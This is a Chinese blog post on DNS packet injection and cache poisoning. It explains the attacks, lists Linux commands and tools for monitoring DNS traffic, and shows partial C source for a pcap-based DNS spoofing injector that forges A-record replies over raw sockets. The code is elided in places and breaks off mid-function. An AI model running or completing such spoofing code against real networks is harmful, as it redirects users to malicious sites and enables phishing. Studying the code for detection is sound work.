<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>深入探讨DNS数据包注入与DNS中毒攻击检测 (C/C&#43;&#43;代码实现) - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="深入探讨DNS数据包注入与DNS中毒攻击检测 (C/C&#43;&#43;代码实现)" />
<meta property="og:description" content="DNS数据包注入和DNS中毒攻击是网络安全领域中的两个重要主题。DNS（域名系统）是互联网中的一项核心服务，负责将域名转换为与之相对应的IP地址。
DNS数据包注入是指攻击者通过篡改或伪造DNS请求或响应数据包来干扰或破坏DNS服务的过程。攻击者可通过注入恶意数据包来改变DNS解析结果，将用户重定向到恶意网站或者进行钓鱼攻击。这样的攻击一般可以通过欺骗或者劫持DNS服务器、中间人攻击或者DNS缓存投毒来实现。
而DNS中毒攻击是指攻击者通过篡改或操纵DNS服务器的缓存记录，将正确的域名解析映射到错误的IP地址上。这样一来，用户在访问一个正常的网站时，却被重定向到一个恶意的站点。这种攻击方式常见于公共Wi-Fi网络，攻击者通过修改DNS服务器设置并将其置于网络中心位置，诱导用户连接到受到攻击的DNS服务器上。
怎么向DNS服务器发送恶意数据包
向DNS服务器发送恶意数据包的方式有多种，其中一种常见的方式是使用受损的端点将带有欺骗性IP地址的UDP数据包发送到DNS递归服务器。这些数据包上的欺骗性地址指向受害者的真实IP地址。每个UDP数据包都向DNS解析器发出请求，通常传递一个参数（例如“ANY”）以接收尽可能最大的响应。DNS解析器收到请求后，会向欺骗性IP地址发送较大的响应。当目标的IP地址接收响应时，其周边的网络基础设施可能会被大量流量淹没，从而导致拒绝服务。
另一种可能的攻击方式是DNS隧道攻击。这种攻击的原理是：在后门程序进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果。如果互联网上存在恶意响应，那么这个响应就会被传送回请求者，从而实施攻击。
监控DNS服务器是否被攻击
Linux下可以通过以下命令监控DNS服务器是否被攻击：
1.查看系统日志信息，可以使用grep命令过滤出与DNS相关的日志，例如：grep “DNS” /var/log/messages。
2.查看网络负载情况，可以使用nload命令监控网络负载。首先需要安装nload工具，可以使用以下命令进行安装：sudo yum install nload。安装完成后，运行nload命令即可查看网络负载情况。
nload命令其他字段含义：
第一行为当前设备的网卡名称和IP地址，下面的显示可以分为两块，上面的而incoming为进入网卡的流量，下面的outgoing为从网卡流出的流量。
在每个模块的右边，有实时的网络流量状况显示，其中，curr为当前网速、avg为平均网速、min为最小网速、max为最大网速，ttl为使用的流量情况统计。
3.查看连接到您服务器的IP地址，可以使用netstat命令，例如：netstat -tuln | grep :53。
请注意，以上命令仅是示例.具体的命令可能因系统版本和配置而有所不同。如果您对Linux操作系统不熟悉，建议寻求专业的技术支持或安全机构的帮助，以确保您的网络安全和稳定。
监控DNS流量并分析流量模式
监控DNS流量并分析流量模式以及单个请求的方法包括以下几个方面：
DNS流量监控工具：使用专门的DNS流量监控工具，例如tcpdump、Wireshark、dnstop等。这些工具可以捕获网络中的DNS流量数据包，并提供详细的分析和统计信息。
DNS服务器日志分析：许多DNS服务器会记录访问日志，其中包含有关每个DNS请求的详细信息。通过分析这些日志文件，可以获得有关DNS流量模式和请求的有用信息。一些常用的DNS服务器软件如BIND、PowerDNS等提供日志记录功能。
DNS流量分析原理：DNS流量的分析通常涉及到解析数据包的相关信息，例如源IP地址、目标IP地址、域名、查询类型等。通过这些信息，可以推断网络中的通信模式和请求的特征。分析流量的目的是确定正常的流量模式，并识别异常或恶意的流量。
流量特征识别：通过监控和分析DNS流量，可以识别一些异常的流量特征，如大量的查询请求、异常的查询类型、短时间内的重复查询、不正常的响应时间等。这些特征可能暗示着DNS数据包注入或中毒攻击的发生。
数据包解析工具：使用数据包解析工具，如Wireshark，可以进一步分析捕获的DNS数据包。通过查看数据包的细节，例如查询字段、响应代码、权威服务器等信息，可以更加深入地了解每个请求的内容，并检测是否存在异常或可疑的特征。
可以监控和分析DNS流量，发现异常流量模式和单个请求中的潜在问题。这有助于及早发现和应对DNS数据包注入和中毒攻击等安全威胁，并保护网络和系统的安全。
深入探讨DNS数据包注入与DNS中毒攻击检测 (C/C&#43;&#43;代码实现)
DNS数据包注入器以混杂模式捕获来自网络接口的流量，并试图注入对所选DNS a请求的伪造响应。DNS中毒攻击检测器检测DNS中毒攻击尝试。
dns_inject
... #define PROMISC 1 #define READ_TIME_OUT 0 #define SIZE_ETHERNET 14 #define IP_SIZE 16 #define PACKET_SIZE 8192 /* Ethernet header */ struct ethernet_header { u_char ether_dhost[ETHER_ADDR_LEN]; u_char ether_shost[ETHER_ADDR_LEN]; u_short ether_type; }; /* DNS header */ struct dns_header { char id[2]; char flags[2]; char qdcount[2]; char ancount[2]; char nscount[2]; char arcount[2]; }; /* DNS Question structure */ struct dns_question { char *qname; char qtype[2]; char qclass[2]; }; /* 文件选项的链接列表节点 */ struct node { char spoof_ip[32]; char spoof_domain[150]; struct node *next; }; void get_ip_of_attacker(char *if_name, char *ip) { struct ifreq ifr; size_t if_name_len = strlen(if_name); if (if_name_len &lt; sizeof(ifr." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/4ef67c140e8bbf159626595b0acb03fd/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-12-24T15:20:56+08:00" />
<meta property="article:modified_time" content="2023-12-24T15:20:56+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">深入探讨DNS数据包注入与DNS中毒攻击检测 (C/C&#43;&#43;代码实现)</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>DNS数据包注入和DNS中毒攻击是网络安全领域中的两个重要主题。DNS（域名系统）是互联网中的一项核心服务，负责将域名转换为与之相对应的IP地址。</p> 
<p>DNS数据包注入是指攻击者通过篡改或伪造DNS请求或响应数据包来干扰或破坏DNS服务的过程。攻击者可通过注入恶意数据包来改变DNS解析结果，将用户重定向到恶意网站或者进行钓鱼攻击。这样的攻击一般可以通过欺骗或者劫持DNS服务器、中间人攻击或者DNS缓存投毒来实现。</p> 
<p>而DNS中毒攻击是指攻击者通过篡改或操纵DNS服务器的缓存记录，将正确的域名解析映射到错误的IP地址上。这样一来，用户在访问一个正常的网站时，却被重定向到一个恶意的站点。这种攻击方式常见于公共Wi-Fi网络，攻击者通过修改DNS服务器设置并将其置于网络中心位置，诱导用户连接到受到攻击的DNS服务器上。</p> 
<p><strong>怎么向DNS服务器发送恶意数据包</strong></p> 
<p>向DNS服务器发送恶意数据包的方式有多种，其中一种常见的方式是使用受损的端点将带有欺骗性IP地址的UDP数据包发送到DNS递归服务器。这些数据包上的欺骗性地址指向受害者的真实IP地址。每个UDP数据包都向DNS解析器发出请求，通常传递一个参数（例如“ANY”）以接收尽可能最大的响应。DNS解析器收到请求后，会向欺骗性IP地址发送较大的响应。当目标的IP地址接收响应时，其周边的网络基础设施可能会被大量流量淹没，从而导致拒绝服务。</p> 
<p>另一种可能的攻击方式是DNS隧道攻击。这种攻击的原理是：在后门程序进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果。如果互联网上存在恶意响应，那么这个响应就会被传送回请求者，从而实施攻击。</p> 
<p><strong>监控DNS服务器是否被攻击</strong></p> 
<p>Linux下可以通过以下命令监控DNS服务器是否被攻击：<br> 1.查看系统日志信息，可以使用grep命令过滤出与DNS相关的日志，例如：grep “DNS” /var/log/messages。</p> 
<p><img src="https://images2.imgbox.com/22/3a/uChuXbe4_o.png" alt=""></p> 
<p>2.查看网络负载情况，可以使用nload命令监控网络负载。首先需要安装nload工具，可以使用以下命令进行安装：sudo yum install nload。安装完成后，运行nload命令即可查看网络负载情况。<br> <img src="https://images2.imgbox.com/7d/5a/PtP3PN3Y_o.png" alt=""></p> 
<p>nload命令其他字段含义：<br> 第一行为当前设备的网卡名称和IP地址，下面的显示可以分为两块，上面的而incoming为进入网卡的流量，下面的outgoing为从网卡流出的流量。<br> 在每个模块的右边，有实时的网络流量状况显示，其中，curr为当前网速、avg为平均网速、min为最小网速、max为最大网速，ttl为使用的流量情况统计。</p> 
<p>3.查看连接到您服务器的IP地址，可以使用netstat命令，例如：netstat -tuln | grep :53。</p> 
<p><img src="https://images2.imgbox.com/f8/46/g1KhqvfE_o.png" alt=""></p> 
<p>请注意，以上命令仅是示例.具体的命令可能因系统版本和配置而有所不同。如果您对Linux操作系统不熟悉，建议寻求专业的技术支持或安全机构的帮助，以确保您的网络安全和稳定。</p> 
<p><strong>监控DNS流量并分析流量模式</strong></p> 
<p>监控DNS流量并分析流量模式以及单个请求的方法包括以下几个方面：</p> 
<ol><li> <p>DNS流量监控工具：使用专门的DNS流量监控工具，例如tcpdump、Wireshark、dnstop等。这些工具可以捕获网络中的DNS流量数据包，并提供详细的分析和统计信息。</p> </li><li> <p>DNS服务器日志分析：许多DNS服务器会记录访问日志，其中包含有关每个DNS请求的详细信息。通过分析这些日志文件，可以获得有关DNS流量模式和请求的有用信息。一些常用的DNS服务器软件如BIND、PowerDNS等提供日志记录功能。</p> </li><li> <p>DNS流量分析原理：DNS流量的分析通常涉及到解析数据包的相关信息，例如源IP地址、目标IP地址、域名、查询类型等。通过这些信息，可以推断网络中的通信模式和请求的特征。分析流量的目的是确定正常的流量模式，并识别异常或恶意的流量。</p> </li><li> <p>流量特征识别：通过监控和分析DNS流量，可以识别一些异常的流量特征，如大量的查询请求、异常的查询类型、短时间内的重复查询、不正常的响应时间等。这些特征可能暗示着DNS数据包注入或中毒攻击的发生。</p> </li><li> <p>数据包解析工具：使用数据包解析工具，如Wireshark，可以进一步分析捕获的DNS数据包。通过查看数据包的细节，例如查询字段、响应代码、权威服务器等信息，可以更加深入地了解每个请求的内容，并检测是否存在异常或可疑的特征。</p> </li></ol> 
<p>可以监控和分析DNS流量，发现异常流量模式和单个请求中的潜在问题。这有助于及早发现和应对DNS数据包注入和中毒攻击等安全威胁，并保护网络和系统的安全。</p> 
<p><strong>深入探讨DNS数据包注入与DNS中毒攻击检测 (C/C++代码实现)</strong></p> 
<p>DNS数据包注入器以混杂模式捕获来自网络接口的流量，并试图注入对所选DNS a请求的伪造响应。DNS中毒攻击检测器检测DNS中毒攻击尝试。</p> 
<p>dns_inject</p> 
<pre><code class="prism language-c">
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PROMISC</span> <span class="token expression"><span class="token number">1</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">READ_TIME_OUT</span> <span class="token expression"><span class="token number">0</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SIZE_ETHERNET</span> <span class="token expression"><span class="token number">14</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IP_SIZE</span> <span class="token expression"><span class="token number">16</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PACKET_SIZE</span> <span class="token expression"><span class="token number">8192</span></span></span>

<span class="token comment">/* Ethernet header */</span>
<span class="token keyword">struct</span> <span class="token class-name">ethernet_header</span> <span class="token punctuation">{<!-- --></span>
	u_char ether_dhost<span class="token punctuation">[</span>ETHER_ADDR_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span>
	u_char ether_shost<span class="token punctuation">[</span>ETHER_ADDR_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span>
	u_short ether_type<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">/* DNS header */</span>
<span class="token keyword">struct</span> <span class="token class-name">dns_header</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">char</span> id<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> flags<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> qdcount<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> ancount<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> nscount<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> arcount<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">/* DNS Question structure */</span>
<span class="token keyword">struct</span> <span class="token class-name">dns_question</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">char</span> <span class="token operator">*</span>qname<span class="token punctuation">;</span>
	<span class="token keyword">char</span> qtype<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> qclass<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>


<span class="token comment">/* 文件选项的链接列表节点 */</span>
<span class="token keyword">struct</span> <span class="token class-name">node</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">char</span> spoof_ip<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> spoof_domain<span class="token punctuation">[</span><span class="token number">150</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">node</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>


<span class="token keyword">void</span> <span class="token function">get_ip_of_attacker</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>if_name<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>ip<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">struct</span> <span class="token class-name">ifreq</span> ifr<span class="token punctuation">;</span>

	<span class="token class-name">size_t</span> if_name_len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>if_name<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>if_name_len <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ifr<span class="token punctuation">.</span>ifr_name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token function">memcpy</span><span class="token punctuation">(</span>ifr<span class="token punctuation">.</span>ifr_name<span class="token punctuation">,</span> if_name<span class="token punctuation">,</span> if_name_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
		ifr<span class="token punctuation">.</span>ifr_name<span class="token punctuation">[</span>if_name_len<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"interface name is too long"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_DGRAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token function">strerror</span><span class="token punctuation">(</span>errno<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> SIOCGIFADDR<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ifr<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">int</span> temp_errno <span class="token operator">=</span> errno<span class="token punctuation">;</span>
		<span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token function">strerror</span><span class="token punctuation">(</span>temp_errno<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span><span class="token operator">*</span> ipaddr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>ifr<span class="token punctuation">.</span>ifr_addr<span class="token punctuation">;</span>
	<span class="token function">memcpy</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> <span class="token function">inet_ntoa</span><span class="token punctuation">(</span>ipaddr<span class="token operator">-&gt;</span>sin_addr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token function">find_checksum</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">long</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">/* assume 32 bit long, 16 bit short */</span>

	<span class="token keyword">while</span> <span class="token punctuation">(</span>len <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		sum <span class="token operator">+=</span> <span class="token operator">*</span>buf<span class="token operator">++</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span>  <span class="token comment">/* if high order bit set, fold */</span>
			sum <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>sum <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		len <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>len<span class="token punctuation">)</span>      <span class="token comment">/* take care of left over byte */</span>
		sum <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">;</span>

	<span class="token keyword">while</span> <span class="token punctuation">(</span>sum <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span>
		sum <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>sum <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token operator">~</span>sum<span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token comment">/*
 * 使用原始套接字发送dns应答
 */</span>
<span class="token keyword">void</span> <span class="token function">send_dns_reply</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> ip<span class="token punctuation">,</span> <span class="token class-name">u_int16_t</span> port<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> packet<span class="token punctuation">,</span> <span class="token keyword">int</span> packlen<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> to_addr<span class="token punctuation">;</span>
	<span class="token keyword">int</span> bytes_sent<span class="token punctuation">,</span> sock<span class="token punctuation">,</span> one <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>

	sock <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_RAW<span class="token punctuation">,</span> IPPROTO_RAW<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>sock <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Could not create socket.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>


<span class="token comment">/* The callback function for pcap_loop */</span>
<span class="token keyword">void</span> <span class="token function">dns_spoof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">node</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">pcap_pkthdr</span> <span class="token operator">*</span>header<span class="token punctuation">,</span> <span class="token keyword">const</span> u_char <span class="token operator">*</span>packet<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

	<span class="token function">memset</span><span class="token punctuation">(</span>reply_packet<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> PACKET_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* define ethernet header */</span>
	ether <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ethernet_header</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>packet<span class="token punctuation">)</span><span class="token punctuation">;</span>
	ip <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">iphdr</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span> ether<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ethernet_header</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* get cleaned up IPs */</span>
	src<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> ip<span class="token operator">-&gt;</span>saddr<span class="token punctuation">;</span>
	dest<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> ip<span class="token operator">-&gt;</span>daddr<span class="token punctuation">;</span>
	<span class="token function">sprintf</span><span class="token punctuation">(</span>src_ip<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token function">inet_ntoa</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">sprintf</span><span class="token punctuation">(</span>dst_ip<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token function">inet_ntoa</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* udp header */</span>
	ip_header_size <span class="token operator">=</span> ip<span class="token operator">-&gt;</span>ihl <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">;</span>
	udp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">udphdr</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span> ip<span class="token punctuation">)</span> <span class="token operator">+</span> ip_header_size<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* dns header */</span>
	dns_hdr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">dns_header</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span> udp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">udphdr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	question<span class="token punctuation">.</span>qname <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span> dns_hdr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">dns_header</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/*
	 * parse domain name
	 */</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

	<span class="token comment">/* get spoof IP */</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>args<span class="token operator">-&gt;</span>spoof_domain<span class="token punctuation">,</span> <span class="token string">"spoof_all"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		spoof_it <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
		<span class="token function">memcpy</span><span class="token punctuation">(</span>spoof_ip<span class="token punctuation">,</span> args<span class="token operator">-&gt;</span>spoof_ip<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		current <span class="token operator">=</span> args<span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span>current <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>current<span class="token operator">-&gt;</span>spoof_domain<span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
				<span class="token function">memcpy</span><span class="token punctuation">(</span>spoof_ip<span class="token punctuation">,</span> current<span class="token operator">-&gt;</span>spoof_ip<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				spoof_it <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			current <span class="token operator">=</span> current<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>spoof_it <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
		reply_packet_size <span class="token operator">=</span> size<span class="token punctuation">;</span>
